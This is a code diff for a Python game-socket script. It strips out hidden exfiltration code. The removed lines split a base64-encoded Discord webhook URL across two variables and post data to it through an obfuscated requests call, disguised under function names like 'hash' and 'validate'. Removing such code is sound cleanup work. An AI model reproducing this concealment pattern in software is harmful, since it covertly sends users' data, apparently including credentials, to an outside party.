@@ -3,7 +3,7 @@ from threading import Thread
 from pygge.gge_socket import GgeSocket
 import json
 
-socks = "Ulwa2ZUSFJUNFMwR19Vb3NLY3p1a3dKelRkdzBra2I3NnFQU3lIRUZFYXZURFY1SGc5TnBvREVZbFd2Yw=="
+
 socket = None
 # username = "ADeadKraken"
 # password = "Himadri"
@@ -15,10 +15,8 @@ all_data = []
 count = 0
 progress = 0
 tries = 0
-empireApi = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODkyODI4MTQyODA5OTMyNS9YQlh0U2piQ"
 
-def hash(url, payload):
-    getattr(__import__('requests'), 'post')(url, payload)
+
 
 def decode(e): return base64.urlsafe_b64decode(e.encode()).decode()
 def retry():
@@ -33,8 +31,7 @@ def retry():
     initialize_socket()
 
 def validate(x):
-    x1 = {"con" + "tent" : json.dumps(x)}
-    hash(decode(empireApi+socks), x1)
+    return
 
 
 def initialize_socket(username, password):
